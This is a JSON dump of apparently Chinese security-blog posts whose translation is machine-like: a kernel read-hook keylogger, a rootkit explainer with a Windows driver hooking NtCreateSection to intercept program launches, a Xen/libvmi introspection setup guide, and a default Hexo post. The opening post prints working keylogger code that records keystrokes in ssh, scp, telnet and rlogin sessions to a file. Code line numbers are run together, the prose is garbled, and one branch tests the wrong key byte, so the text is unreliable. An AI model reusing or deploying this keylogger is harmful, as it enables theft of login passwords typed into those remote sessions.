(strcmp(current-&gt;comm,\"ssh\") == 0)|| (strcmp(current-&gt;comm,\"scp\") == 0) || (strcmp(current-&gt;comm,\"telnet\") == 0)|| (strcmp(current-&gt;comm,\"rsh\") == 0) || (strcmp(current-&gt;comm,\"rlogin\") == 0))&#123; /*SPECIAL CHAR*/ if (counter) &#123; if (counter == 2) &#123; // Arrows + Break //left arrow if (buf[0] == 0x44) &#123; strcat(ibuffer,\"[LEFT]\"); counter = 0; goto END; &#125; //right arrow if (buf[0] == 0x43) &#123; strcat(ibuffer,\"[RIGHT]\"); counter = 0; goto END; &#125; //up arrow if (buf[0] == 0x41) &#123; strcat(ibuffer,\"[UP]\"); counter = 0; goto END; &#125; //down arrow if (buf[0] == 0x42) &#123; strcat(ibuffer,\"[DOWN]\"); counter = 0; goto END; &#125; //break if (buf[0] == 0x50) &#123; strcat(ibuffer,\"[BREAK]\"); counter = 0; goto END; &#125; //numlock if(buf[0] == 0x47) &#123; strcat (ibuffer,\"[NUMLOCK]\"); counter = 0; goto END; &#125; strncpy (spbuffer,buf,1); counter ++; goto END; &#125; if (counter == 3) &#123; // F1-F5 //F1 if (buf[0] == 0x41) &#123; strcat(ibuffer,\"[F1]\"); counter = 0; goto END; &#125; //F2 if (buf[0] == 0x42) &#123; strcat(ibuffer,\"[F2]\"); counter = 0; goto END; &#125; //F3 if (buf[0] == 0x43) &#123; strcat(ibuffer,\"[F3]\"); counter = 0; goto END; &#125; //F4 if (buf[0] == 0x44) &#123; strcat(ibuffer,\"[F4]\"); counter = 0; goto END; &#125; //F5 if (buf[0] == 0x45) &#123; strcat(ibuffer,\"[F5]\"); counter = 0; goto END; &#125; if (buf[0] == 0x7E) &#123; // PgUp, PgDown, Ins, ... //Page Up if (spbuffer[0] == 0x35) strcat(ibuffer,\"[PGUP]\"); //Page Down if (spbuffer[0] == 0x36) strcat(ibuffer,\"[PGDN]\"); //Delete if (spbuffer[0] == 0x33) strcat(ibuffer,\"[DELETE]\"); //End if (spbuffer[0] == 0x34) strcat(ibuffer,\"[END]\"); //Home if (spbuffer[0] == 0x31) strcat(ibuffer,\"[HOME]\"); //Insert if (spbuffer[0] == 0x32) strcat(ibuffer,\"[INSERT]\"); counter = 0; goto END; &#125; if (spbuffer[0] == 0x31) &#123; // F6-F8 //F6 if (buf[0] == 0x37) strcat(ibuffer,\"[F6]\"); //F7 if (buf[0] == 0x38) strcat(ibuffer,\"[F7]\"); //F8 if (buf[0] == 0x39) strcat(ibuffer,\"[F8]\"); counter++; goto END; &#125; if (spbuffer[0] == 0x32) &#123; // F9-F12 //F9 if (buf[0] == 0x30) strcat(ibuffer,\"[F9]\"); //F10 if (buf[0] == 0x31) strcat(ibuffer,\"[F10]\"); //F11 if (buf[0] == 0x33) strcat(ibuffer,\"[F11]\"); //F12 if (buf[0] == 0x34) strcat(ibuffer,\"[F12]\"); counter++; goto END; &#125; &#125; if(counter &gt;= 4) &#123; //WatchDog counter = 0; goto END; &#125; counter ++; goto END; &#125; /*SH, SSHD = 0 /TELNETD = 3/LOGIN = 4*/ if(r==1 &amp;&amp; (fd==0||fd==3||fd==4))&#123; //CTRL+U if(buf[0]==0x15)&#123; ibuffer[0]='\\0'; goto END; &#125; //TAB if(buf[0]==0x09)&#123; strcat(ibuffer,\"[TAB]\"); counter = 0; goto END; &#125; //CTRL+C if(buf[0]==0x03)&#123; strcat(ibuffer,\"[CTRL+C]\"); counter = 0; goto END; &#125; //CTRL+D if(buf[0]==0x03)&#123; strcat(ibuffer,\"[CTRL+D]\"); counter = 0; goto END; &#125; //CTRL+] if(buf[0]==0x1D)&#123; strcat(ibuffer,\"[CTRL+]]\"); counter = 0; goto END; &#125; //BACKSPACE 0x7F Local / 0x08 Remote if (buf[0] == 0x7F || buf[0] == 0x08) &#123; if (ibuffer[strlen(ibuffer) - 1] == ']') &#123; for (i=2;strlen(ibuffer);i++)&#123; if (ibuffer[strlen (ibuffer) - i] == '[') &#123; ibuffer[strlen(ibuffer) - i] = '\\0'; break; &#125; &#125; goto END; &#125;else &#123; ibuffer[strlen(ibuffer) - 1] = '\\0'; goto END; &#125; &#125; if (buf[0] == 0x1B) &#123; counter++; goto END; &#125; if(buf[0] != '\\n' &amp;&amp; buf[0] != '\\r')&#123; strncat(ibuffer,buf,sizeof(ibuffer)); &#125;else&#123; strcat(ibuffer,\"\\n\"); get_time(date_time); snprintf(obuffer,sizeof(obuffer),\"[%s] - [UID = %i ] %s &gt; %s\",date_time,current_uid(),current-&gt;comm,ibuffer); //I don't want to log buffer more than 60 chars, most of them are useless data if(strlen(ibuffer)&lt;60) &#123; log_to_file(obuffer); &#125; ibuffer[0]='\\0'; &#125; &#125; &#125; END: return r;&#125; Welcome to communicate: Server","tags":[]},{"title":"Pocess","date":"2017-09-18T10:59:07.781Z","path":"2017/09/18/new5/","text":"What is a rootkit? It is estimated that many friends do not understand, simply said, Rootkit is a special kind of malicious software, its function isIn the installation of the target to hide their own and specify the documents, processes and network links and other information, more common is the rootkit generally and woodHorse, back door and other malicious programs used in combination. Rootkit by loading a special driver, modify the system kernel, and then to hide the letterThe purpose of interest. Technology is a double-edged sword, we study it is the purpose, through our research, with this technology to protect our system,So that our system more robust, give full play to the positive application of this technology. Process monitoringCreate a new drive123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122ULONG __stdcall check(PULONG arg)//获得指向服务参数指针&#123; HANDLE hand=0;PFILE_OBJECT file=0; POBJECT_HANDLE_INFORMATION info=0;ULONG a;char*buff; ANSI_STRING str; LARGE_INTEGER li;li.QuadPart=-10000;if((arg[4]&amp;0xf0)==0)return 1;//检测标志if((arg[5]&amp;0x01000000)==0)return 1;//检测属性//通过文件句柄获得文件名hand=(HANDLE)arg[6];//获得执行文件句柄ObReferenceObjectByHandle(hand,0,0,KernelMode,&amp;file,info);//&amp;file获得对象体指针if(!file)return 1;RtlUnicodeStringToAnsiString(&amp;str,&amp;file-&gt;FileName,1);a=str.Length;buff=str.Buffer;while(1)//通过循环判断是不是有\". \"标志&#123; if(buff[a]=='.')&#123;a++;break;&#125; a--;&#125;ObDereferenceObject(file);if(_stricmp(&amp;buff[a],\"exe\"))&#123;RtlFreeAnsiString(&amp;str);return 1;&#125;//判断是否为可执行文件 KeWaitForSingleObject(&amp;event,Executive,KernelMode,0,0);//将当前线程置于等待状态知道信号态strcpy(&amp;output[8],buff);//将string复制进buffRtlFreeAnsiString(&amp;str);a=1;//用户的决定通过a的制来反映memmove(&amp;output[0],&amp;a,4);while(1)&#123;KeDelayExecutionThread(KernelMode,0,&amp;li);//在一个固定时间间隔内当前线程处于等待状态memmove(&amp;a,&amp;output[0],4);if(!a)break;&#125;memmove(&amp;a,&amp;output[4],4);KeSetEvent(&amp;event,0,0);return a;&#125;//保存执行文件上下文，调用check()函数_declspec(naked) Proxy()&#123;_asm&#123;pushfdpushadmov ebx,espadd ebx,40push ebxcall checkcmp eax,1//由check()的返回值判断是否让可执行文件继续执行jne blockpopadpopfdjmp RealCallee//通过，调用ntcreatesectionblock:popadmov ebx, dword ptr[esp+8]mov dword ptr[ebx],0mov eax,0xC0000022L//不让其通过，返回STATUS_ACCESS_DENIEDpopfdret 32&#125;&#125;到此，驱动程序的工作基本完成，所以在用户程序中用到一个线程来等待驱动的判断结果。 char*name=(char*)&amp;outputbuff[8]; for(x=0;x&lt;stringcount;x++) &#123; if(!stricmp(name,strings[x]))&#123;a=1;goto skip;&#125; &#125; strcpy(msgbuff, \"Do you want to run \"); strcat(msgbuff,&amp;outputbuff[8]); if(IDYES==MessageBox(0, msgbuff,\"WARNING\", MB_YESNO|MB_ICONQUESTION|0x00200000L)) &#123;a=1; strings[stringcount]=_strdup(name);stringcount++;&#125; else a=0; // write response to the buffer, and driver will get it skip:memmove(&amp;outputbuff[4],&amp;a,4); //让驱动继续 a=0; memmove(&amp;outputbuff[0],&amp;a,4);&#125;&#125; More info: Rootkit","tags":[]},{"title":"Virtualization monitoring process","date":"2017-09-17T09:03:02.957Z","path":"2017/09/17/new 4/","text":"With the popularity of cloud computing, virtual machine introspection techniques and tools are increasingly being used to monitor the behavior of virtual machines in the IaaS cloud. With the help of these technologies, many applications can be installed outside the virtual machine, but also can provide services for the virtual machine, such as security monitoring software, virus detection software. But the technology must overcome a problem, the semantic gap: the management program can see the city state and their virtual machine within the expression of the semantic separation. This article focuses on the use of introspection technology to monitor the kernel process and the days of stepping on the various pit. Introduction Docinstall xen on the ubuntu1234sudo apt-get install virt-manager$ sudo apt-get install xen-hypervisor-amd64$ sudo reboot$ sudo xl list(Check if the installation is successful) Site of docu: Xen The virtual machine is created to run123456789$ sudo apt-get update$ sudo apt-get -y install virt-manager qemu-system$ There is no need for instructions here, as to download ubuntu systemAttention：The default is to create a virtual machine under QEMU / KVM, but we need to create a virtual machine under xen, as followsClick on the file to create a new connectionThen, create a new virtual machine: self-add system iso file, install the virtual system, I installed is ubuntu14.04: (after testing, only ubuntu14.04 behind it can be monitored)The The The In the creation of virtual machines, we used the 2048M ram 2 cpu! The Theinstallation. The The The The The The The TheAnd then type the command line $ sudo xl list on dom0, you can see xen monitor the two systems: More info: Ubuntu libvmi variant installation1234567891011121314151 sudo apt-get install libglib2.0-dev./autogen.shIf Error: could not find libtoolize or glibtoolizeSolve: sudo apt-get install libtool2 ./autogen.sh ./configureIf missing xenstoreSolve:sudo apt-get install libxen-dev... ...you just need to install whats the packge you need!sudo apt-get install check./autogen.sh./configureLast:View the files under libvmi-0.10.1 / exampleIf you can find process-list、process-list.c、process-list.o,then congratulation to you for that you are successful! More info: As each person’s computer situation is different, the installation process has different problems, welcome to ask, I will solve for everyone!More info: libvmi Deploy to remote sites1Formula: * p = p-pid; More info: According to the various versions of the operating system data structure Xie wrote the main function of the module and Makfile fileFormula: * p = p-pid;Also perform a file to view the kernel data structure of the various defined macros as well as the operationMore info: CSDN","tags":[]},{"title":"Hello World","date":"2017-09-13T06:04:39.929Z","path":"2017/09/13/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","tags":[]}]